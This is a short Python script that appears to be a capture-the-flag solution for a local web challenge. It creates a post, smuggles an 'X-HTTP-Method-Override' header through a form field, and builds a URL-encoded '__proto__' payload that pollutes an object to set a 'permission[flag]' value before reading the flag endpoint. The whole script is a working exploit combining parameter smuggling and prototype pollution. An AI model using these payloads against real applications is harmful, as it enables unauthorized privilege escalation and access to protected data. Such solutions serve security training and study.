import requests

API_BASE_URL = 'http://localhost:8400'
FRONTEND_BASE_URL = 'http://localhost:8401'

r = requests.post(f'{API_BASE_URL}/api/post', data={
    'title': 'aaa',
    'content': 'aaa'
})
id = r.json()['post']['id']

data = {
    'title': 'bbb',
    'content': 'bbb',
    'headers[X-HTTP-Method-Override]': 'PUT'
}
r = requests.put(f'{API_BASE_URL}/api/post/{id}', data='&'.join(f'{k}={v}' for k, v in data.items()), headers={
    'Content-Type': 'application/x-www-form-urlencoded'
})

payload = f'{id}%3ftitle%3dpiyo%26permission%5bflag%5d%3dyes%26,{id},__proto__,a'
print(f'report {payload}')
print(f'then, access {API_BASE_URL}/api/post/{id}/has_enough_permission_to_get_the_flag')